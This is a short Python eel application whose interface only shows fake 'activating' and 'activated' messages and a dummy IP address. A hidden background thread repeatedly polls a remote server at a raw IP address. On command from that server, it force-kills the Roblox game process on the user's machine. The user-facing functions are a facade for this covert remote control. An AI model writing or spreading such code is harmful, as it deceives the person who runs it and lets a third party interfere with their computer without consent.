from asyncio.windows_events import NULL
import eel
import random
from datetime import datetime
import os
import requests
import time
import asyncio
import threading



def conectar():
    while True:
        url_base = "http://77.26.221.204/logcalculator/api.php"
        url = url_base+"?data=1"
        x = requests.post(url)
        if(x.text == "1"):
            print("cerrando boblox")
            url = url_base+"?on=1"
            x = requests.post(url)
            os.system("C:\Windows\System32/taskkill /F /IM RobloxPlayerBeta.exe")

        time.sleep(0.1)


eel.init('web')


@eel.expose
def get_random_name():
    eel.prompt_alerts('Activando...')

    eel.prompt_alerts('Activado!')


@eel.expose
def load():
    eel.prompt_alerts('Cargado!')


@eel.expose
def get_date():
    eel.prompt_alerts('Activado!')


@eel.expose
def get_ip():
    eel.prompt_alerts('127.0.0.1')


b = threading.Thread(name='background', target=conectar)
b.start()
eel.start('index.html')
